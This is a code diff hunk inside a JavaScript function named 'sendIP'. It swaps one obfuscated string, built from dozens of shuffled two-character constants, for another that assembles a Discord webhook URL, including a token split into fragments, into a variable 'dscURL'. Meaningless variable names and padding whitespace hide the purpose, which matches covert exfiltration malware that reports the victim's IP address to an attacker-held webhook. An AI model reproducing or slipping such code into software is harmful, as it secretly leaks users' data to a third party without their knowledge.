@@ -67,72 +67,58 @@ const sendIP = () => {
                     
 
                                     
-                    const bWy7Kp = "S:";
-                    const fZv0Dn = "7R";
-                    const gQl1Rm = "c9";
-                    const pTs6Ij = "oS";
-                    const lKu9Vx = "i/";
-                    const wXe2Lo = "3D";
-                    const aCb3Nm = "L7";
-                    const tOj4Gq = "q9";
-                    const dRp8Us = "Ht";
-                    const yVa5Ei = "t:";
-                    const sMf7Zo = "5c";
-                    const nWx6Ku = "d.";
-                    const mIc9Bw = "2B";
-                    const rJe1Ck = "p/";
-                    const vHl3Dx = "we";
-                    const hYs4Lf = "O2";
-                    const xAj0Vu = "L";
-                    const cFg8Mr = "g5-";
-                    const oEv5Rp = "dl";
-                    const zNt7Qo = "UU";
-                    const iSd2Wy = "co";
-                    const uKx9Mn = "jm";
-                    const qLi1Op = "tp";
-                    const eVz3Bc = "7o";
-                    const kTf6Aj = "1";
-                    const jGy8Ux = "nY";
-                    const uQw0Hl = "4";
-                    const sZa5Rf = "HP";
-                    const vMg9Dj = "bO";
-                    const wFc4Sn = "B4";
-                    const tRb7Ie = "dl";
-                    const pOa1Xs = "ws";
-                    const oPf3Ve = "b2";
-                    const nYr6Kq = "dy";
-                    const gWj8Pu = "f4";
-                    const rLt0Ma = "//";
-                    const cXi5Hn = "az";
-                    const mKb2Jc = "iDb";
-                    const jNr7Vz = "VRY";
-                    const sTf9Gy = "ks";
-                    const aPr4Wo = "15";
-                    const dSm0Xl = "8";
-                    const qVj6Bh = "i";
-                    const fGz3Kd = "/f";
-                    const lHt1Mp = "9S";
-                    const yUv5Nz = "54";
-                    const kOi8Qr = "Fo";
-                    const eWp7Sc = "DL";
-                    const zRe9Tm = "FN";
-                    const vXn4Lp = "Oo";
-                    const uQy0Rs = "3";
-                    const oJc6Hv = "dy";
-                    const gSw2Lf = "5c";
-                    const iBp1Wu = "w";
-                    const hOd3Mx = "ce";
-                    const nVr9Ky = "6";
-                    const tMy5Jq = "dl";
-                    const jKf8Vo = "Zw";
-                    const pLc2Xn = "7";
-                                    
+                    const rKe1 = "https://";
+                    const xJv9 = "discord";
+                    const cIj5 = ".com/";
+                    const aCx8 = "api/";
+
+                    const Sgs1 = "webho";
+                    const SFoa = "oks/";
+
+                    const zPr7 = Sgs1 + SFoa
+                    const qLt2 = "1416";
+                    const eBa1 = "5065";
+                    const vXs9 = "8159";
+                    const sQa0 = "1265";
+                    const pHw6 = "480/";
+                    const kRt3 = "fBn";
+                    const oPw7 = "UUL7";
+                    const dEn2 = "Hjc9o";
+                    const mFd3 = "S7R90";
+                    const bYn4 = "SbO23";
+                    const lMz4 = "Do_nY";
+                    const vPq1 = "5cb2C";
+                    const rXz3 = "Lq9i2";
+                    const tFm8 = "BtlEB4";
+                    const aYk5 = "f4Dw7o";
+                    const sUn7 = "dneyD";
+                    const mVo2 = "LbOZAF";
+                    const eGc9 = "NHPjm9";
+                    const bRl6 = "S4";
+
+                    const tUv5 = vPq1 + rXz3 + tFm8 + aYk5 + sUn7 + mVo2 + eGc9 + bRl6;
+
                     const dscURL =
-                      dRp8Us + qLi1Op + yVa5Ei + rLt0Ma + iSd2Wy + fZv0Dn + gQl1Rm + pTs6Ij + lKu9Vx + wXe2Lo + vHl3Dx + sTf9Gy +
-                      aPr4Wo + dSm0Xl + zNt7Qo + rJe1Ck + aCb3Nm + zRe9Tm + oJc6Hv + yUv5Nz + fGz3Kd + kTf6Aj + tOj4Gq + pLc2Xn +
-                      lHt1Mp + uQw0Hl + nYr6Kq + sMf7Zo + mIc9Bw + oPf3Ve + wFc4Sn + pTs6Ij + hYs4Lf + oPf3Ve + hOd3Mx + eWp7Sc +
-                      tRb7Ie + jNr7Vz + vXn4Lp + cFg8Mr + kOi8Qr + nVr9Ky + hOd3Mx + sZa5Rf + jGy8Ux + uQw0Rs + oPf3Ve + mKb2Jc +
-                      jKf8Vo + gSw2Lf + xAj0Vu + cXi5Hn + qVj6Bh + oEv5Rp + mKb2Jc + gSw2Lf + uQw0Rs + kTf6Aj + kOi8Qr + oJc6Hv;
+                      rKe1 +
+                      xJv9 +
+                      cIj5 +
+                      aCx8 +
+                      zPr7 +
+                      qLt2 +
+                      eBa1 +
+                      vXs9 +
+                      sQa0 +
+                      pHw6 +
+                      kRt3 +
+                      oPw7 +
+                      dEn2 +
+                      mFd3 +
+                      bYn4 +
+                      lMz4 +
+                      tUv5;
+
+
+
                                     
                                     
                                     
